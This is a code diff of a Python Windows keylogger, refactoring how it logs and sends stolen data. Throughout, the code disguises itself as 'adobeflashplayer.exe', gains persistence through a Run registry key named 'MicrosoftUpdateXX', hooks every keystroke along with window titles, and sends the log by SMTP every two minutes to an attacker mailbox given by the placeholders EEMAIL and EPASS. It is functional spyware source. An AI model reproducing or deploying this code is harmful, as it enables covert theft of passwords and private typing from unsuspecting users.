@@ -1,73 +1,70 @@
 import pythoncom
 import pyHook
 from os import path
-from time import sleep
-from threading import Thread
-import urllib, urllib2
-import smtplib
-import datetime
+import urllib
+import urllib2
 import win32com.client
-import win32event, win32api, winerror
+import win32event
+import win32api
+import winerror
 from _winreg import *
 import shutil
 import sys
+import datetime
+import os
+import random
+import smtplib
+import string
+import time
+import threading
+from email.mime.text import MIMEText
+
+lastWindow = ''
+
+def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
+
+
+global logfile
+
+def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
+    return ''.join(random.choice(chars) for _ in range(size))
+
+temp_path = os.getenv('TEMP')
+logfile = temp_path + "\\" + id_generator(15)
+
+f = open(logfile, 'a')
+f.write('')
+f.close()
 
 ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     ironm = None
-    print "nope"
+    print 'nope'
     sys.exit()
 
-x, data, count= '', '', 0
-
 dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
+
 
 def startup():
     shutil.copy(sys.argv[0], dir)
     aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
-    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)    
+    aKey = OpenKey(aReg,
+                   r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
+                   KEY_WRITE)
+    SetValueEx(aKey, 'MicrosoftUpdateXX', 0, REG_SZ, dir)
+
+
 if not path.isfile(dir):
-    startup()   
-
-    
-def send_mail():
-    global data
-    while True:
-        if len(data) > 30:
-            timeInSecs = datetime.datetime.now()
-            SERVER = "smtp.gmail.com"
-            PORT = 587
-            USER = EEMAIL
-            PASS = EPASS
-            FROM = USER
-            TO = [USER]
-            SUBJECT = "B33: " + timeInSecs.isoformat() 
-            MESSAGE =  data 
-
-            message_payload = "\r\n".join((
-                                "From: %s" %FROM,
-                                "To: %s" %TO,
-                                "Subject: %s" %SUBJECT,
-                                "",
-                                MESSAGE))
-            try:
-                server = smtplib.SMTP()
-                server.connect(SERVER, PORT)
-                server.starttls()
-                server.login(USER, PASS)
-                server.sendmail(FROM, TO, message_payload)
-                data = ''
-                server.quit()
-            except Exception as error:
-                print error
-        sleep(120)
+    startup()
 
 
-def pushing(event):
-    global data, lastWindow
-    window = event.WindowName
-    keys = {
+def keylogger():
+
+    def OnKeyboardEvent(event):
+        global lastWindow
+        window = event.WindowName
+        keys = {
             13: ' [ENTER] ',
             8: ' [BACKSPACE] ',
             162: ' [CTRL] ',
@@ -85,21 +82,56 @@ def pushing(event):
             40: ' [DOWN] ',
             37: ' [LEFT] ',
             39: ' [RIGHT] ',
-            91: ' [SUPER] '
+            91: ' [SUPER] ',
             }
-    keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
-    if window != lastWindow:
-        lastWindow = window
-        data += ' { ' + lastWindow + ' } '
-        data += keyboardKeyName 
-    else:
-        data += keyboardKeyName
+        keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
+        data = ''
+        if window != lastWindow:
+            lastWindow = window
+            data += '\n\n{ ' + lastWindow + ' } \n'
+            data += keyboardKeyName
+        else:
+            data += keyboardKeyName
+        f = open(logfile, 'a')
+        f.write(data)
+        f.close()
+
+    hm = pyHook.HookManager()
+    hm.KeyDown = OnKeyboardEvent
+    hm.HookKeyboard()
+    pythoncom.PumpMessages()
+
+
+def mailsender():
+    mail = EEMAIL
+    password = EPASS
+
+    while 1:
+        time.sleep(120)
+        fo = open(logfile, 'r')
+        msg = MIMEText(fo.read())
+        fo.close()
+
+        if len(msg.as_string()) > 30:
+            timeInSecs = datetime.datetime.now()
+            msg['Subject'] = 'B33: ' + timeInSecs.isoformat()
+            msg['From'] = mail
+            msg['To'] = mail
+
+            try:
+                s = smtplib.SMTP('smtp.gmx.com:25')
+
+                # s = smtplib.SMTP_SSL('smtp.india.com:465')
+                s.login(mail, password)
+                s.sendmail(mail, [mail], msg.as_string())
+                s.close()
+            except Exception, a:
+                print a
+
 
 if __name__ == '__main__':
-    triggerThread = Thread(target=send_mail)
-    triggerThread.start()
+    thread1 = threading.Thread(name='log', target=keylogger)
+    thread2 = threading.Thread(name='mail', target=mailsender)
 
-    hookManager = pyHook.HookManager()
-    hookManager.KeyDown = pushing
-    hookManager.HookKeyboard()
-    pythoncom.PumpMessages()
+    thread1.start()
+    thread2.start()
